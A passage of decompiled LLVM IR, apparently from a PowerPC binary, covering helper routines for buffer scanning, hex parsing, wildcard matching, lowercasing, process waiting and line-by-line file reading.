  %v4_10001af0 = call i32 @function_1000c33c(i32 %v3_10001ad8, i32 0, i32 %tmp)
  %v3_10001af4 = load i32, i32* %stack_var_-48, align 4
  store i32 268442368, i32* @lr, align 4
  %v1_10001afc = call i32 @function_1000c2f4(i32 %v3_10001af4)
  br label %dec_label_pc_10001b00

dec_label_pc_10001b00:                            ; preds = %dec_label_pc_10001ad8, %dec_label_pc_10001ae4
  store i32 268442380, i32* @lr, align 4
  %v1_10001b08 = call i32 @function_1000c2f4(i32 %tmp3)
  br label %dec_label_pc_10001b0c

dec_label_pc_10001b0c:                            ; preds = %dec_label_pc_10001ac8, %dec_label_pc_10001b00
  %v8_10001b30 = call i32 @function_1000fca4(i32 ptrtoint ([8 x i8]* @global_var_10017710.31 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017138.32 to i32), i32 ptrtoint ([3 x i8]* @global_var_10017718.33 to i32), i32 %arg1, i32 0)
  %v1_10001b38 = call i32 @function_1000c228(i32 127)
  br label %dec_label_pc_10001b3c

dec_label_pc_10001b3c:                            ; preds = %dec_label_pc_10001a58, %dec_label_pc_10001b0c
  %v2_10001b40 = load i8, i8* %arg2, align 1
  %v3_10001b48 = icmp eq i8 %v2_10001b40, 114
  %v3_10001b50 = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_10001b48, label %dec_label_pc_10001b50, label %dec_label_pc_10001b68

dec_label_pc_10001b50:                            ; preds = %dec_label_pc_10001b3c
  store i32 ptrtoint (i32* @global_var_10001b64.35 to i32), i32* @lr, align 4
  %v1_10001b60 = call i32 @function_1000c2f4(i32 %tmp3)
  br label %dec_label_pc_10001b7c

dec_label_pc_10001b68:                            ; preds = %dec_label_pc_10001b3c
  store i32 268442492, i32* @lr, align 4
  %v1_10001b78 = call i32 @function_1000c2f4(i32 %v3_10001b50)
  br label %dec_label_pc_10001b7c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001b50, %dec_label_pc_10001b68
  %stack_var_-36.0 = phi i32 [ %v3_10001b50, %dec_label_pc_10001b50 ], [ %tmp3, %dec_label_pc_10001b68 ]
  %v1_10001b80 = mul i32 %stack_var_-36.0, 4
  %v3_10001b8c = load i32, i32* @global_var_1002b918.27, align 4
  %v2_10001b90 = add i32 %v3_10001b8c, %v1_10001b80
  %v2_10001b98 = inttoptr i32 %v2_10001b90 to i32*
  store i32 %v0_10001a34, i32* %v2_10001b98, align 4
  br label %dec_label_pc_10001ba4

dec_label_pc_10001ba4:                            ; preds = %dec_label_pc_10001a68, %dec_label_pc_10001a04, %dec_label_pc_100019cc, %dec_label_pc_10001998, %dec_label_pc_10001974, %dec_label_pc_10001b7c
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001a04 ], [ -1, %dec_label_pc_10001a68 ], [ %stack_var_-36.0, %dec_label_pc_10001b7c ], [ -1, %dec_label_pc_100019cc ], [ -1, %dec_label_pc_10001998 ], [ -1, %dec_label_pc_10001974 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_10001b50, { 1, 0 }
  uselistorder i32 %v1_100019dc, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000c33c, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001ba4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10001b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001b00, { 1, 0 }
  uselistorder label %dec_label_pc_10001ac8, { 1, 0 }
  uselistorder label %dec_label_pc_10001a34, { 1, 0 }
  uselistorder label %dec_label_pc_10001974, { 1, 0 }
}

define i32 @function_10001bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001bc4:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_10001be0 = load i32, i32* @global_var_1002b918.27, align 4
  %v3_10001be4 = icmp eq i32 %v3_10001be0, 0
  br i1 %v3_10001be4, label %dec_label_pc_10001c10, label %dec_label_pc_10001bec

dec_label_pc_10001bec:                            ; preds = %dec_label_pc_10001bc4
  %v1_10001bf0 = mul i32 %arg1, 4
  %v2_10001c00 = add i32 %v3_10001be0, %v1_10001bf0
  %v1_10001c04 = inttoptr i32 %v2_10001c00 to i32*
  %v2_10001c04 = load i32, i32* %v1_10001c04, align 4
  %v3_10001c08 = icmp eq i32 %v2_10001c04, 0
  br i1 %v3_10001c08, label %dec_label_pc_10001c10, label %dec_label_pc_10001c1c

dec_label_pc_10001c10:                            ; preds = %dec_label_pc_10001bec, %dec_label_pc_10001bc4
  br label %dec_label_pc_10001d44

dec_label_pc_10001c1c:                            ; preds = %dec_label_pc_10001bec
  store i32 268442660, i32* @lr, align 4
  %v1_10001c20 = call i32 @function_1000c2f4(i32 %arg1)
  %v2_10001c24 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268442672, i32* @lr, align 4
  %v1_10001c2c = call i32 @function_1000eddc(i32 %v2_10001c24)
  store i32 %v2_10001c24, i32* @r3, align 4
  store i32 268442688, i32* @lr, align 4
  %v2_10001c3c = call i32 @function_1000ed90(i32 %v2_10001c24, i32 2)
  store i32 %v2_10001c24, i32* @r3, align 4
  store i32 268442704, i32* @lr, align 4
  %v2_10001c4c = call i32 @function_1000ed90(i32 %v2_10001c24, i32 3)
  store i32 %v2_10001c24, i32* @r3, align 4
  store i32 268442720, i32* @lr, align 4
  %v2_10001c5c = call i32 @function_1000ed90(i32 %v2_10001c24, i32 1)
  %v2_10001c64 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268442744, i32* @lr, align 4
  %v3_10001c74 = call i32 @function_1000c714(i32 0, i32 %v2_10001c24, i32 %v2_10001c64)
  %v2_10001c94 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001c78

dec_label_pc_10001c78:                            ; preds = %dec_label_pc_10001cc0, %dec_label_pc_10001c1c
  %v3_10001c88 = load i32, i32* @global_var_1002b918.27, align 4
  %v2_10001c8c = add i32 %v3_10001c88, %v1_10001bf0
  %v1_10001c90 = inttoptr i32 %v2_10001c8c to i32*
  %v2_10001c90 = load i32, i32* %v1_10001c90, align 4
  store i32 268442792, i32* @lr, align 4
  %v3_10001ca4 = call i32 @function_1000c7d4(i32 %v2_10001c90, i32 %v2_10001c94, i32 0)
  %v4_10001cb8 = icmp eq i32 %v3_10001ca4, -1
  br i1 %v4_10001cb8, label %dec_label_pc_10001cc0, label %dec_label_pc_10001cd4

dec_label_pc_10001cc0:                            ; preds = %dec_label_pc_10001c78
  %v0_10001cc0 = call i32 @function_1000c85c()
  %v1_10001cc8 = inttoptr i32 %v0_10001cc0 to i32*
  %v2_10001cc8 = load i32, i32* %v1_10001cc8, align 4
  %v3_10001ccc = icmp eq i32 %v2_10001cc8, 4
  br i1 %v3_10001ccc, label %dec_label_pc_10001c78, label %dec_label_pc_10001cd4

dec_label_pc_10001cd4:                            ; preds = %dec_label_pc_10001c78, %dec_label_pc_10001cc0
  %v4_10001cb8.lcssa = phi i1 [ false, %dec_label_pc_10001c78 ], [ true, %dec_label_pc_10001cc0 ]
  store i32 268442856, i32* @lr, align 4
  %v3_10001ce4 = call i32 @function_1000c714(i32 2, i32 %v2_10001c64, i32 0)
  %v1_10001cec = mul i32 %tmp5, 4
  %v3_10001cf8 = load i32, i32* @global_var_1002b918.27, align 4
  %v2_10001cfc = add i32 %v3_10001cf8, %v1_10001cec
  %v2_10001d04 = inttoptr i32 %v2_10001cfc to i32*
  store i32 0, i32* %v2_10001d04, align 4
  br i1 %v4_10001cb8.lcssa, label %dec_label_pc_10001d3c, label %dec_label_pc_10001d18

dec_label_pc_10001d18:                            ; preds = %dec_label_pc_10001cd4
  %v3_10001d18 = load i32, i32* %stack_var_-52, align 4
  %v1_10001d24 = call i32 @__asm_rlwinm(i32 %v3_10001d18, i32 0, i32 16, i32 23)
  %v4_10001d28 = sdiv i32 %v1_10001d24, 256
  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001cd4, %dec_label_pc_10001d18
  %storemerge2 = phi i32 [ %v4_10001d28, %dec_label_pc_10001d18 ], [ -1, %dec_label_pc_10001cd4 ]
  br label %dec_label_pc_10001d44

dec_label_pc_10001d44:                            ; preds = %dec_label_pc_10001c10, %dec_label_pc_10001d3c
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_10001d3c ], [ -1, %dec_label_pc_10001c10 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10001c24, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_10001bf0, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000ed90, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001d44, { 1, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001cd4, { 1, 0 }
}

define i32 @function_10001d64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001d64:
  br label %dec_label_pc_10001dd8

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001de8
  store i32 268443064, i32* @lr, align 4
  %v1_10001db4 = call i32 @function_1000c63c(i32 %arg3)
  %v1_10001dc4 = add nuw i32 %storemerge25, 1
  %v3_10001dd0 = icmp eq i32 %v1_10001db4, 1
  br i1 %v3_10001dd0, label %dec_label_pc_10001dd8, label %dec_label_pc_10001e0c

dec_label_pc_10001dd8:                            ; preds = %dec_label_pc_10001d64, %dec_label_pc_10001d98
  %storemerge25 = phi i32 [ 0, %dec_label_pc_10001d64 ], [ %v1_10001dc4, %dec_label_pc_10001d98 ]
  %v2_10001de0 = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_10001de0, label %dec_label_pc_10001de8, label %dec_label_pc_10001e0c

dec_label_pc_10001de8:                            ; preds = %dec_label_pc_10001dd8
  %v2_10001df4 = add i32 %storemerge25, %arg1
  %v1_10001df8 = add i32 %v2_10001df4, -1
  %v1_10001dfc = inttoptr i32 %v1_10001df8 to i8*
  %v2_10001dfc = load i8, i8* %v1_10001dfc, align 1
  %v3_10001e04 = icmp eq i8 %v2_10001dfc, 10
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001de8, %dec_label_pc_10001dd8, %dec_label_pc_10001d98
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001de8 ], [ 1, %dec_label_pc_10001dd8 ], [ %v1_10001db4, %dec_label_pc_10001d98 ]
  %v3_10001e10 = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_10001e10, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001db4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd8, { 1, 0 }
}

define i32 @function_10001e4c(i8* %arg1) local_unnamed_addr {
dec_label_pc_10001e4c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10001ea83 = load i8, i8* %arg1, align 1
  %v3_10001eb06 = icmp eq i8 %v2_10001ea83, 0
  br i1 %v3_10001eb06, label %dec_label_pc_10001ec4, label %dec_label_pc_10001eb8

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001eb8
  %v1_10001e6c = mul i32 %stack_var_-40.07, 16
  %v2_10001e74 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001e74 = zext i8 %v2_10001e74 to i32
  %v1_10001e84 = mul nuw nsw i32 %v3_10001e74, 4
  %v2_10001e88 = add i32 %v1_10001e84, ptrtoint (i32* @global_var_1001771c.36 to i32)
  %v1_10001e8c = inttoptr i32 %v2_10001e88 to i32*
  %v2_10001e8c = load i32, i32* %v1_10001e8c, align 4
  %v2_10001e90 = or i32 %v2_10001e8c, %v1_10001e6c
  %v1_10001e9c = add i32 %v4_10001ea49, 1
  %v5_10001ea0 = inttoptr i32 %v1_10001e9c to i8*
  %v2_10001ea8 = load i8, i8* %v5_10001ea0, align 1
  %v3_10001eb0 = icmp eq i8 %v2_10001ea8, 0
  br i1 %v3_10001eb0, label %dec_label_pc_10001ec4, label %dec_label_pc_10001eb8

dec_label_pc_10001eb8:                            ; preds = %dec_label_pc_10001e4c, %dec_label_pc_10001e68
  %v4_10001ea49 = phi i32 [ %v1_10001e9c, %dec_label_pc_10001e68 ], [ %tmp, %dec_label_pc_10001e4c ]
  %stack_var_-24.08 = phi i8* [ %v5_10001ea0, %dec_label_pc_10001e68 ], [ %arg1, %dec_label_pc_10001e4c ]
  %stack_var_-40.07 = phi i32 [ %v2_10001e90, %dec_label_pc_10001e68 ], [ 0, %dec_label_pc_10001e4c ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4

dec_label_pc_10001ec4:                            ; preds = %dec_label_pc_10001e68, %dec_label_pc_10001eb8, %dec_label_pc_10001e4c
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_10001e4c ], [ %v2_10001e90, %dec_label_pc_10001e68 ], [ %stack_var_-40.07, %dec_label_pc_10001eb8 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001ec4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001eb8, { 1, 0 }
}

define i32 @function_10001edc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001edc:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_10001f00 = load i8, i8* %arg1, align 1
  %v3_10001f10 = icmp eq i8 %v2_10001f00, 42
  br i1 %v3_10001f10, label %dec_label_pc_10001f48, label %dec_label_pc_10001f18

dec_label_pc_10001f18:                            ; preds = %dec_label_pc_10001edc
  %v3_10001f1c = icmp eq i8 %v2_10001f00, 63
  br i1 %v3_10001f1c, label %dec_label_pc_10001fbc, label %dec_label_pc_10001f24

dec_label_pc_10001f24:                            ; preds = %dec_label_pc_10001f18
  %v3_10001f28 = icmp eq i8 %v2_10001f00, 0
  br i1 %v3_10001f28, label %dec_label_pc_10001f34, label %dec_label_pc_10002018

dec_label_pc_10001f34:                            ; preds = %dec_label_pc_10001f24
  %v2_10001f38 = load i8, i8* %tmp, align 1
  %v3_10001f38 = zext i8 %v2_10001f38 to i32
  br label %dec_label_pc_1000209c

dec_label_pc_10001f48:                            ; preds = %dec_label_pc_10001edc
  %v2_10001f4c = add i32 %tmp8, 1
  store i32 268443484, i32* @lr, align 4
  %v5_10001f58 = inttoptr i32 %v2_10001f4c to i8*
  %v6_10001f58 = call i32 @function_10001edc(i8* %v5_10001f58, i32 %arg2, i32 %tmp8)
  %v3_10001f60 = icmp eq i32 %v6_10001f58, 0
  br i1 %v3_10001f60, label %dec_label_pc_10001fa8, label %dec_label_pc_10001f68

dec_label_pc_10001f68:                            ; preds = %dec_label_pc_10001f48
  %v2_10001f6c = load i8, i8* %tmp, align 1
  %v3_10001f74 = icmp eq i8 %v2_10001f6c, 0
  br i1 %v3_10001f74, label %dec_label_pc_10001fb0, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f68
  %v2_10001f80 = add i32 %arg2, 1
  store i32 268443536, i32* @lr, align 4
  %v6_10001f8c = call i32 @function_10001edc(i8* nonnull %arg1, i32 %v2_10001f80, i32 %arg2)
  %v3_10001f94 = icmp eq i32 %v6_10001f8c, 0
  br i1 %v3_10001f94, label %dec_label_pc_10001fa8, label %dec_label_pc_10001fb0

dec_label_pc_10001fa8:                            ; preds = %dec_label_pc_10001f7c, %dec_label_pc_10001f48
  br label %dec_label_pc_10001fb0

dec_label_pc_10001fb0:                            ; preds = %dec_label_pc_10001f68, %dec_label_pc_10001f7c, %dec_label_pc_10001fa8
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10001fa8 ], [ 1, %dec_label_pc_10001f7c ], [ 1, %dec_label_pc_10001f68 ]
  br label %dec_label_pc_1000209c

dec_label_pc_10001fbc:                            ; preds = %dec_label_pc_10001f18
  %v2_10001fc0 = load i8, i8* %tmp, align 1
  %v3_10001fc8 = icmp eq i8 %v2_10001fc0, 0
  br i1 %v3_10001fc8, label %dec_label_pc_1000200c, label %dec_label_pc_10001fd0

dec_label_pc_10001fd0:                            ; preds = %dec_label_pc_10001fbc
  %v1_10001fd4 = add i32 %tmp8, 1
  %v2_10001fdc = add i32 %arg2, 1
  store i32 268443628, i32* @lr, align 4
  %v4_10001fe8 = inttoptr i32 %v1_10001fd4 to i8*
  %v5_10001fe8 = call i32 @function_10001edc(i8* %v4_10001fe8, i32 %v2_10001fdc, i32 %arg2)
  %v3_10001ff0 = icmp ne i32 %v5_10001fe8, 0
  %. = zext i1 %v3_10001ff0 to i32
  br label %dec_label_pc_1000200c

dec_label_pc_1000200c:                            ; preds = %dec_label_pc_10001fd0, %dec_label_pc_10001fbc
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10001fbc ], [ %., %dec_label_pc_10001fd0 ]
  br label %dec_label_pc_1000209c

dec_label_pc_10002018:                            ; preds = %dec_label_pc_10001f24
  %v3_1000201c = load i8, i8* %arg1, align 1
  %v4_1000201c = zext i8 %v3_1000201c to i32
  store i32 268443696, i32* @lr, align 4
  %v3_1000202c = call i32 @function_1000c83c(i32 %v4_1000201c, i32 %tmp8)
  %v3_10002038 = load i8, i8* %tmp, align 1
  %v4_10002038 = zext i8 %v3_10002038 to i32
  store i32 268443724, i32* @lr, align 4
  %v3_10002048 = call i32 @function_1000c83c(i32 %v4_10002038, i32 %arg2)
  %v4_10002050 = icmp eq i32 %v3_1000202c, %v3_10002048
  br i1 %v4_10002050, label %dec_label_pc_10002058, label %dec_label_pc_10002094

dec_label_pc_10002058:                            ; preds = %dec_label_pc_10002018
  %v1_1000205c = add i32 %tmp8, 1
  %v2_10002064 = add i32 %arg2, 1
  store i32 268443764, i32* @lr, align 4
  %v4_10002070 = inttoptr i32 %v1_1000205c to i8*
  %v5_10002070 = call i32 @function_10001edc(i8* %v4_10002070, i32 %v2_10002064, i32 %arg2)
  %v3_10002078 = icmp ne i32 %v5_10002070, 0
  %.7 = zext i1 %v3_10002078 to i32
  br label %dec_label_pc_10002094

dec_label_pc_10002094:                            ; preds = %dec_label_pc_10002058, %dec_label_pc_10002018
  %storemerge = phi i32 [ 1, %dec_label_pc_10002018 ], [ %.7, %dec_label_pc_10002058 ]
  br label %dec_label_pc_1000209c

dec_label_pc_1000209c:                            ; preds = %dec_label_pc_1000200c, %dec_label_pc_10001fb0, %dec_label_pc_10001f34, %dec_label_pc_10002094
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_10001fb0 ], [ %storemerge2, %dec_label_pc_1000200c ], [ %v3_10001f38, %dec_label_pc_10001f34 ], [ %storemerge, %dec_label_pc_10002094 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_1000209c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001fb0, { 2, 1, 0 }
}

define i32 @function_100020c0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100020c0:
  store i32 268443880, i32* @lr, align 4
  %v1_100020e4 = call i32 @function_1000e800(i32 %arg1)
  store i32 %v1_100020e4, i32* %arg2, align 4
  %v4_10002100 = icmp eq i32 %v1_100020e4, -1
  %. = zext i1 %v4_10002100 to i32
  ret i32 %.
}

define i32 @function_1000213c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000213c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_100021902 = load i8, i8* %arg1, align 1
  %v3_100021985 = icmp eq i8 %v2_100021902, 0
  br i1 %v3_100021985, label %dec_label_pc_100021a0, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_1000213c, %dec_label_pc_10002158
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10002158 ], [ %arg1, %dec_label_pc_1000213c ]
  %storemerge.in6 = phi i32 [ %v1_10002184, %dec_label_pc_10002158 ], [ %tmp, %dec_label_pc_1000213c ]
  %v3_1000215c = load i8, i8* %storemerge7, align 1
  %v4_1000215c = zext i8 %v3_1000215c to i32
  store i32 %v4_1000215c, i32* %r3.global-to-local, align 4
  store i32 268444016, i32* @lr, align 4
  %v3_1000216c = call i32 @function_1000c83c(i32 %v4_1000215c, i32 %storemerge.in6)
  store i32 %v3_1000216c, i32* %r3.global-to-local, align 4
  %v1_1000217c = trunc i32 %v3_1000216c to i8
  store i8 %v1_1000217c, i8* %storemerge7, align 1
  %v1_10002184 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10002184 to i8*
  %v2_10002190 = load i8, i8* %storemerge, align 1
  %v3_10002198 = icmp eq i8 %v2_10002190, 0
  br i1 %v3_10002198, label %dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge, label %dec_label_pc_10002158

dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge: ; preds = %dec_label_pc_10002158
  %v0_100021b4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100021a0

dec_label_pc_100021a0:                            ; preds = %dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge, %dec_label_pc_1000213c
  %v0_100021b4 = phi i32 [ %v0_100021b4.pre, %dec_label_pc_1000218c.dec_label_pc_100021a0_crit_edge ], [ %tmp, %dec_label_pc_1000213c ]
  ret i32 %v0_100021b4

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10002184, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10002158, { 1, 0 }
}

define i32 @function_100021b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100021b8:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268444132, i32* @lr, align 4
  %v3_100021e0 = call i32 @function_1000c524(i32 ptrtoint ([14 x i8]* @global_var_10017b1c.37 to i32), i32 0)
  %v2_10002380 = ptrtoint i32* %stack_var_-4128 to i32
  %v1_100021f8 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10002380

dec_label_pc_100021f0:                            ; preds = %dec_label_pc_10002380
  store i32 268444156, i32* @lr, align 4
  %v2_100021f8 = call i32 @function_1000213c(i8* %v1_100021f8)
  store i32 268444176, i32* @lr, align 4
  %v5_1000220c = call i32 @function_1000e1b0(i32 %v2_10002380, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017b2c.38, i32 0, i32 0), i32 268500992)
  %v4_1000221c = icmp eq i32 %v5_1000220c, %v2_10002380
  br i1 %v4_1000221c, label %dec_label_pc_10002224, label %dec_label_pc_10002368

dec_label_pc_10002224:                            ; preds = %dec_label_pc_100021f0
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10002240

dec_label_pc_10002234:                            ; preds = %dec_label_pc_10002268, %dec_label_pc_10002254, %dec_label_pc_10002240
  %v1_10002238 = add i32 %v4_10002240, 1
  %v5_1000223c = inttoptr i32 %v1_10002238 to i8*
  br label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_10002224, %dec_label_pc_10002234
  %storemerge2 = phi i8* [ %v5_1000223c, %dec_label_pc_10002234 ], [ %tmp15, %dec_label_pc_10002224 ]
  %v4_10002240 = ptrtoint i8* %storemerge2 to i32
  %v2_10002244 = load i8, i8* %storemerge2, align 1
  %v3_1000224c = icmp eq i8 %v2_10002244, 32
  br i1 %v3_1000224c, label %dec_label_pc_10002234, label %dec_label_pc_10002254

dec_label_pc_10002254:                            ; preds = %dec_label_pc_10002240
  %v2_10002258 = load i8, i8* %storemerge2, align 1
  %v3_10002260 = icmp eq i8 %v2_10002258, 9
  br i1 %v3_10002260, label %dec_label_pc_10002234, label %dec_label_pc_10002268

dec_label_pc_10002268:                            ; preds = %dec_label_pc_10002254
  %v2_1000226c = load i8, i8* %storemerge2, align 1
  %v3_10002274 = icmp eq i8 %v2_1000226c, 58
  br i1 %v3_10002274, label %dec_label_pc_10002234, label %dec_label_pc_100022a8.preheader

dec_label_pc_100022a8.preheader:                  ; preds = %dec_label_pc_10002268
  %v2_100022c0 = add i32 %v4_10002240, -1
  br label %dec_label_pc_100022a8

dec_label_pc_10002280:                            ; preds = %dec_label_pc_100022d8, %dec_label_pc_100022a8
  store i32 %v4_10002240, i32* @r3, align 4
  %v0_10002288 = call i32 @function_1000df60()
  %v1_1000229c = add i32 %v0_10002288, %v2_100022c0
  %v3_100022a4 = inttoptr i32 %v1_1000229c to i8*
  store i8 0, i8* %v3_100022a4, align 1
  br label %dec_label_pc_100022a8

dec_label_pc_100022a8:                            ; preds = %dec_label_pc_100022a8.preheader, %dec_label_pc_10002280
  store i32 %v4_10002240, i32* @r3, align 4
  %v0_100022b0 = call i32 @function_1000df60()
  %v1_100022c4 = add i32 %v0_100022b0, %v2_100022c0
  %v1_100022c8 = inttoptr i32 %v1_100022c4 to i8*
  %v2_100022c8 = load i8, i8* %v1_100022c8, align 1
  %v3_100022d0 = icmp eq i8 %v2_100022c8, 13
  br i1 %v3_100022d0, label %dec_label_pc_10002280, label %dec_label_pc_100022d8

dec_label_pc_100022d8:                            ; preds = %dec_label_pc_100022a8
  store i32 %v4_10002240, i32* @r3, align 4
  %v0_100022e0 = call i32 @function_1000df60()
  %v1_100022f4 = add i32 %v0_100022e0, %v2_100022c0
  %v1_100022f8 = inttoptr i32 %v1_100022f4 to i8*
  %v2_100022f8 = load i8, i8* %v1_100022f8, align 1
  %v3_10002300 = icmp eq i8 %v2_100022f8, 10
  br i1 %v3_10002300, label %dec_label_pc_10002280, label %dec_label_pc_10002308

dec_label_pc_10002308:                            ; preds = %dec_label_pc_100022d8
  store i32 %v4_10002240, i32* @r3, align 4
  store i32 268444440, i32* @lr, align 4
  %v2_10002314 = call i32 @function_1000de0c(i32 %v4_10002240, i32 46)
  %v3_1000231c = icmp eq i32 %v2_10002314, 0
  br i1 %v3_1000231c, label %dec_label_pc_10002340, label %dec_label_pc_10002324

dec_label_pc_10002324:                            ; preds = %dec_label_pc_10002308
  store i32 %v4_10002240, i32* @r3, align 4
  store i32 268444468, i32* @lr, align 4
  %v2_10002330 = call i32 @function_1000de0c(i32 %v4_10002240, i32 46)
  %v3_1000233c = inttoptr i32 %v2_10002330 to i8*
  store i8 0, i8* %v3_1000233c, align 1
  br label %dec_label_pc_10002340

dec_label_pc_10002340:                            ; preds = %dec_label_pc_10002308, %dec_label_pc_10002324
  %v3_10002350 = call i32 @function_1000df40(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_1000235c.39 to i32), i32* @lr, align 4
  %v1_10002358 = call i32 @function_1000c2f4(i32 %v3_100021e0)
  br label %dec_label_pc_100023b0

dec_label_pc_10002368:                            ; preds = %dec_label_pc_100021f0
  store i32 268444544, i32* @lr, align 4
  %v3_1000237c = call i32 @function_1000dd4c(i32 %v2_10002380, i32 0, i32 4096)
  br label %dec_label_pc_10002380

dec_label_pc_10002380:                            ; preds = %dec_label_pc_100021b8, %dec_label_pc_10002368
  %v3_10002390 = call i32 @function_10001d64(i32 %v2_10002380, i32 4096, i32 %v3_100021e0)
  %v3_10002398 = icmp eq i32 %v3_10002390, 0
  br i1 %v3_10002398, label %dec_label_pc_100023a0, label %dec_label_pc_100021f0

dec_label_pc_100023a0:                            ; preds = %dec_label_pc_10002380
  store i32 ptrtoint (i32* @global_var_100023a8.40 to i32), i32* @lr, align 4
  %v1_100023a4 = call i32 @function_1000c2f4(i32 %v3_100021e0)
  br label %dec_label_pc_100023b0

dec_label_pc_100023b0:                            ; preds = %dec_label_pc_10002340, %dec_label_pc_100023a0
  %storemerge = phi i32 [ 1, %dec_label_pc_100023a0 ], [ 0, %dec_label_pc_10002340 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10002240, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10002380, { 3, 0, 1, 2 }
  uselistorder i32 %v3_100021e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100023b0, { 1, 0 }
  uselistorder label %dec_label_pc_10002380, { 1, 0 }
  uselistorder label %dec_label_pc_10002340, { 1, 0 }
  uselistorder label %dec_label_pc_100022a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002240, { 1, 0 }
}

define i32 @function_100023d0() local_unnamed_addr {
dec_label_pc_100023d0:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268444672, i32* @lr, align 4
  %v3_100023fc = call i32 @function_1000c524(i32 ptrtoint ([14 x i8]* @global_var_10017b1c.37 to i32), i32 0)
